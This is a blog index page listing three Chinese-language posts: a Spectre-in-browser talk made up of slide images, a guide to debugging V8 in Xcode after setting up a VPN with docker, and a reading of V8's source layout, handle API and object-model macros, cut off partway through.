<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />






<meta property="og:type" content="website">
<meta property="og:title" content="Sakuraのblog">
<meta property="og:url" content="http://eternalsakura13.com/page/2/index.html">
<meta property="og:site_name" content="Sakuraのblog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Sakuraのblog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: 'QOPH9ID41Z',
      apiKey: '',
      indexName: 'sakura',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://eternalsakura13.com/page/2/"/>





  <title>Sakuraのblog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-113420358-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sakuraのblog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/21/kanxue/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/21/kanxue/" itemprop="url">被“幽灵”困扰的浏览器</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-21T17:07:03+08:00">
                2018-07-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-091936.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092223.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092420.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092444.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092549.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092615.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092651.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092739.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092800.png" alt=""></p>
<h3 id="Spectre-in-Browser"><a href="#Spectre-in-Browser" class="headerlink" title="Spectre in Browser"></a>Spectre in Browser</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092827.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093134.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093251.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093319.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093354.png" alt=""></p>
<h3 id="Real-attack-of-“Spectre”"><a href="#Real-attack-of-“Spectre”" class="headerlink" title="Real attack of “Spectre”"></a>Real attack of “Spectre”</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093520.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093537.png" alt=""></p>
<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093627.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/20/v8_xcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/20/v8_xcode/" itemprop="url">在mac上使用xcode调试v8</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-20T16:07:44+08:00">
                2018-07-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。<br>然后命令行调试还是太太太麻烦了，于是在VPN搭好了之后，就在xcode上干活了。</p>
<h2 id="搭建VPN并连接"><a href="#搭建VPN并连接" class="headerlink" title="搭建VPN并连接"></a>搭建VPN并连接</h2><p>在之前搭ss的服务器上运行一个vpn的docker(人生苦短，我用docker)<br>直接切换到root然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    --name ipsec-vpn-server \</span><br><span class="line">    --restart=always \</span><br><span class="line">    -e VPN_IPSEC_PSK=你的密码 \</span><br><span class="line">    -e VPN_USER=你的用户名 \</span><br><span class="line">    -e VPN_PASSWORD=你的共享密码（其实和密码填一样就好了，不会弄混） \</span><br><span class="line">    -p 500:500/udp \</span><br><span class="line">    -p 4500:4500/udp \</span><br><span class="line">    -v /lib/modules:/lib/modules:ro \</span><br><span class="line">    -d --privileged \</span><br><span class="line">    hwdsl2/ipsec-vpn-server</span><br></pre></td></tr></table></figure></p>
<p>连接VPN<br><a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">http://www.vpngate.net/cn/howto_l2tp.aspx</a></p>
<h2 id="mac上编译"><a href="#mac上编译" class="headerlink" title="mac上编译"></a>mac上编译</h2><p>怎么获取源码，终端编译之前已经写过了，懒得赘述。<br>这里讲一下怎么建立xcode工程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/gn --ide=&quot;xcode&quot;</span><br></pre></td></tr></table></figure></p>
<p>这样，在out目录下就会有gn文件夹，里面有all.xcworkspace文件，可以直接使用xcode打开这个工作区文件，接下来要设置编译的目标，在Product-&gt;Scheme下选择d8，否则会编译出错，这样就只编译d8这个可执行程序，使用d8就可以直接调试v8的源代码。<br>然后直接Build，编译时间有些长，会自动生成v8的链接库，等待编译完成，在Product-&gt;EditScheme菜单中把poc文件作为运行参数，在对应文件中下好断点，直接运行就会断下来了。</p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>噫，我好像只是教了怎么搭VPN……</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/09/zujian/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/09/zujian/" itemprop="url">V8 javascript engine代码阅读</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T17:25:34+08:00">
                2018-07-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="v8代码组成"><a href="#v8代码组成" class="headerlink" title="v8代码组成"></a>v8代码组成</h2><h3 id="目录结构概要"><a href="#目录结构概要" class="headerlink" title="目录结构概要"></a>目录结构概要</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src ---+</span><br><span class="line">       |</span><br><span class="line">       +---arm</span><br><span class="line">       +---arm64</span><br><span class="line">       +---mips</span><br><span class="line">       +---mips64</span><br><span class="line">A      +---ia32</span><br><span class="line">       +---x64</span><br><span class="line">       +---ppc</span><br><span class="line">       +---s390</span><br><span class="line">       +---wasm</span><br><span class="line">       +---asmjs</span><br><span class="line">       |</span><br><span class="line">       +---ast</span><br><span class="line">       +---compiler</span><br><span class="line">B      +---compiler-dispatcher</span><br><span class="line">       +---interpreter</span><br><span class="line">       +---parsing</span><br><span class="line">       |</span><br><span class="line">       +---js</span><br><span class="line">       +---builtins</span><br><span class="line">C      +---runtime</span><br><span class="line">       +---snapshot</span><br><span class="line">       +---regexp</span><br><span class="line">       +---profiler</span><br><span class="line">       |</span><br><span class="line">D      +---ic</span><br><span class="line">       |</span><br><span class="line">       +---heap</span><br><span class="line">E      +---heap-symbols.h</span><br><span class="line">       +---zone</span><br><span class="line">       +---objects</span><br><span class="line">       |</span><br><span class="line">F      +---inspector</span><br><span class="line">       |</span><br><span class="line">       +---base</span><br><span class="line">       +---debug</span><br><span class="line">       +---tracing</span><br><span class="line">       +---extensions</span><br><span class="line">G      +---libplatform</span><br><span class="line">       +---libsampler</span><br><span class="line">       +---third_party</span><br><span class="line">       +---trap-handler</span><br><span class="line">       |</span><br><span class="line">       +---*.cc<span class="comment">/*.h</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br><span class="line"><span class="comment">       .</span></span><br></pre></td></tr></table></figure>
<ul>
<li>A:存储汇编代码，反汇编程序，宏汇编程序，模拟器等，对于不同CPU不同。</li>
<li>B:code generation系统，例如parse, compile, interpreter, etc.</li>
<li>C:JS built-in function和runtime helper function</li>
<li>D:Inline Cache code </li>
<li>E:object model(对象模型)和memory(内存)相关代码</li>
<li>F:Inspector</li>
<li>G:Debugging and platform abstraction layer codes are stored.</li>
</ul>
<h3 id="必读代码"><a href="#必读代码" class="headerlink" title="必读代码"></a>必读代码</h3><ul>
<li>api.h/api.cc<br>An API for Embedder is defined.</li>
<li>objects.h/objects.cc<br>定义了v8的所有对象模型</li>
<li>compiler/compiler.cc<br>编译的入口点</li>
<li>compiler/pipeline.cc<br>和compiler.cc关联，放置TurboFan</li>
<li>runtime/runtime-*.cc<br>A runtime function is defined.</li>
<li>builtins/builtin-*.cc<br>A faster runtime function group. It is described in CodeStubAssembler (commentary) or Assembler.</li>
<li>interpreter/*.cc<br>Ignition解释器</li>
<li>ic/*.cc<br>Inline Caching的实现<br>存储Runtime(?)</li>
</ul>
<h2 id="v8的内部实现"><a href="#v8的内部实现" class="headerlink" title="v8的内部实现"></a>v8的内部实现</h2><h3 id="公开API"><a href="#公开API" class="headerlink" title="公开API"></a>公开API</h3><ul>
<li>v8::HandleScope<br>生成一个虚拟的作用域，监视（绑定）从v8的GC分配的对象</li>
<li>v8::Local<br>v8有GC，但c++没有GC<br>相反，它通过<a href="https://zh.wikipedia.org/wiki/RAII" target="_blank" rel="noopener">RAII</a> (Resource Acquisition Is Initialization)分配和释放资源<br>在C++中有一个称为析构函数的函数，当分配到stack上的类超出作用域并被丢弃时，该函数被调用。<br>通过v8::Local，当超出了类的作用域时，会自动调用析构函数，析构函数会自动释放资源，实现一种所谓的<a href="http://www.cnblogs.com/TenosDoIt/p/3456704.html" target="_blank" rel="noopener">智能指针</a>功能。<br>v8::Local是一个包装类，用于监视在c++中分配给堆的对象，并在调用析构函数时与当前的HandleScope一起删除。<br>例如：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>创建v8::HandleScope后，所有v8::Local都将分配给该v8::HandleScope。<br>因此，当在测试函数结束时调用handle_scope析构函数时，也会删除与v8 :: HandleScope相关的所有v8::Local。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-10-124518.png" alt=""></p>
<ul>
<li>v8::Handle<br>被v8::Local包装的类，但实际上链接到v8::HandleScope。<br>有些api会返回这个v8::Handle，但基本上它就像v8::Local一样使用。</li>
<li>v8::Isolate<br>v8::Isolate是v8代码库底层部分的一个非常特殊的部分。<br>最初v8有很多静态方法，对多线程没有太多考虑。<br>嗯，这是有问题的，因为Chromium必须分离进程并启动v8。<br>顺便说一句，事实证明，在Embedder端尝试多线程会导致相当大的问题。<br>出于这个原因，构建了v8::Isolate机制。<br>v8::Isolate是一个存储在<a href="https://blog.csdn.net/linyt/article/details/51931737" target="_blank" rel="noopener">线程本地存储（TLS）</a>中的巨大对象<br>几乎存储了与执行上下文链接的所有全局信息。<br>由于它存储在Tls中，因此可以透明地为每个线程提供不同的v8::Isolate，因此Embedder端可以在对其他线程不了解的情况下编写代码。<br><strong>内部使用的各种对象（FixedArray）和表示隐藏类等的Map类也是从这个v8::Isolate生成的</strong>。<br>几乎所有地方都传递了这个类，没有v8::Isolate就很难编写代码。<br>再次使用上面的示例代码<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-102213.jpg" alt=""><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  v8::Isolate* isolate = v8::Isolate::GetCurrent();</span><br><span class="line">  v8::HandleScope handle_scope;</span><br><span class="line"></span><br><span class="line">  v8::Local&lt;v8::Array&gt; <span class="built_in">array</span> = v8::Array::New(isolate, <span class="number">3</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>你还可以看到此函数也传递了v8::Isolate。<br>它是v8::Array::New等等，但是v8::Isoalte实际上生成了这个数组。<br>因此，在v8中，没有太多需要考虑线程冲突，所以这是一个相当方便的机制。</p>
<h3 id="v8-internal"><a href="#v8-internal" class="headerlink" title="v8::internal"></a>v8::internal</h3><p>除了外部公共API之外的所有类，都在v8::internal命名空间中定义。</p>
<h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><p>v8非常特殊，它在C++中创建自己的对象模型。<br>该对象模型在src/objects.h的开头注释中描述，<br>当它被简化和提取时，就会变成这样。</p>
<ul>
<li>Object<ul>
<li>Smi (immediate small integer)</li>
<li>HeapObject (superclass for everything allocated in the heap)<ul>
<li>JSReceiver (suitable for property access)<ul>
<li>JSObject</li>
<li>JSProxy</li>
</ul>
</li>
<li>FixedArrayBase<ul>
<li>ByteArray</li>
<li>BytecodeArray</li>
<li>FixedArray</li>
<li>FixedDoubleArray</li>
</ul>
</li>
<li>Name<ul>
<li>String</li>
<li>Symbol</li>
</ul>
</li>
<li>HeapNumber</li>
<li>BigInt</li>
<li>Cell</li>
<li>PropertyCell</li>
<li>PropertyArray</li>
<li>Code</li>
<li>AbstractCode, a wrapper around Code or BytecodeArray</li>
<li>Map</li>
<li>Oddball</li>
<li>Foreign</li>
<li>SmallOrderedHashTable</li>
<li>SharedFunctionInfo</li>
<li>Struct</li>
<li>WeakCell</li>
<li>FeedbackVector</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>我们创建了一个以v8::i::Object为基类的对象树。<br>几乎所有在v8中使用的类都继承自v8::i::Object，这看起来像java。<br>v8不遵循c++方式使这个对象模型运行良好。<br>由于某些原因，这些类不通过c++类来创建字段。<br>这些类仅用于表示c++中的内存布局，并且所有字段都是通过直接为此指针指定偏移量来获得的。<br>换句话说，忽略c++对象布局，我们自己完全控制内存布局。<br>当以伪代码表示时，看起来像这样：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class SomeObject &#123;</span><br><span class="line">  <span class="function">Value* <span class="title">get_field1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    <span class="keyword">return</span> Value::Cast(self);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* self = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="keyword">this</span>);</span><br><span class="line">    self += header_offset;</span><br><span class="line">    *self = Smi::Cast(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> OBJECT_SIZE = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">32</span>;</span><br><span class="line">SomeObject* object = <span class="keyword">reinterpret_cast</span>&lt;SomeObject*&gt;(<span class="built_in">malloc</span>(OBJECT_SIZE));</span><br><span class="line">object-&gt;Initialize();</span><br><span class="line">object-&gt;get_filed1(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p>
<p>通过这种方式，你可以自己控制字段的偏移。<br>让我们了解一下层次结构顶端的两个分支：</p>
<h3 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h3><p>首先是v8::i::HeapObject。<br>由于v8::i::Object建立了如上所述的直接通过偏移的内存布局<br>在访问字段时，继承HeapObject的对象使用以下宏。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIELD_ADDR(p, offset) \</span></span><br><span class="line">  (<span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(p) + offset - kHeapObjectTag)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READ_FIELD(p, offset) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(FIELD_ADDR_CONST(p, offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是在GC并发标记为ON时以原子方式更新字段</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> v8_CONCURRENT_MARKING</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value)                             \</span></span><br><span class="line">  base::Relaxed_Store(                                            \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(FIELD_ADDR(p, offset)), \</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(value));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_FIELD(p, offset, value) \</span></span><br><span class="line">  (*<span class="keyword">reinterpret_cast</span>&lt;Object**&gt;(FIELD_ADDR(p, offset)) = value)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SMI_ACCESSORS(FixedArrayBase, length, kLengthOffset)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMI_ACCESSORS_CHECKED(holder, name, offset, condition) \</span></span><br><span class="line">  <span class="keyword">int</span> holder::name() <span class="keyword">const</span> &#123;                                   \</span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    Object* value = READ_FIELD(<span class="keyword">this</span>, offset);                  \</span><br><span class="line">    <span class="keyword">return</span> Smi::ToInt(value);                                  \</span><br><span class="line">  &#125;                                                            \</span><br><span class="line">  <span class="keyword">void</span> holder::set_#<span class="meta">#name(int value) &#123;                         \</span></span><br><span class="line">    DCHECK(condition);                                         \</span><br><span class="line">    WRITE_FIELD(<span class="keyword">this</span>, offset, Smi::FromInt(value));            \</span><br><span class="line">  